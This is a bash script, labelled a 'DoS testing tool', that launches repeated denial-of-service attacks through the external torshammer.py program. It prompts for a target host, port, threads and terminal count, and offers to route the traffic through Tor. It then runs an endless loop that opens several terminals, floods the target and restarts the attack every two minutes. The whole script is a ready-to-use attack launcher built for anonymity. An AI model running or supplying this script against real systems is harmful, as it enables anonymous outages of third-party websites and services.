#!/bin/bash
trap 'printf "\e[1;77m Ctrl+c was pressed, exiting...\e[0m"; killall python; exit 0' 2
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[1;77m Please, run this program as root!\n \e[0m"
   exit 1
fi
}

config() {
default_port="80"
default_threads="600"
default_inst="4"
default_tor="y"
printf "\e[1;77m"
read -p "Target: " target
read -p "Port (Default 80): " port
port="${port:-${default_port}}"
read -p "Threads: (Default 600): " threads
threads="${threads:-${default_threads}}"
read -p "Terminals (Default 4): " inst
inst="${inst:-${default_inst}}"
read -p "Anonymized via Tor? (start tor before) [y/n]: " tor
printf "\e[0m"
tor="${tor:-${default_tor}}"
if [[ $tor == "y" ]]; then
eval $tor="-T"
else
eval $tor=""
fi
}
attack() {
i=1
while true; do
  let i=1
  while [ $i -le $inst ]; do
gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $port -r $threads $tor
i=$((i+1))
done
sleep 120
killall python
done
}

banner() {

printf "\e[1;32m  ____ __ ___ \e[0m      \e[1;35m__ ____ ____ __  __ _ _\n \e[0m"  
printf "\e[1;32m(_  _/  (  ,) \e[0m    \e[1;35m(  (_  _(_  _(  )/ _( ) )\n \e[0m" 
printf "\e[1;32m  )(( () )  \ \e[0m    \e[1;35m/__\ )(   )( /__( (_ )  \ \n \e[0m" 
printf "\e[1;32m (__)\__(_)\_) \e[0m  \e[1;35m(_)(_(__) (__(_)(_\__(_)\_) \n \e[0m"
printf "\e[1;77m DoS testing tool \e[0m \n\n"
}
banner
checkroot
config
printf "\e[1;32m Press Ctrl + C to stop attack \e[0m \n"
attack

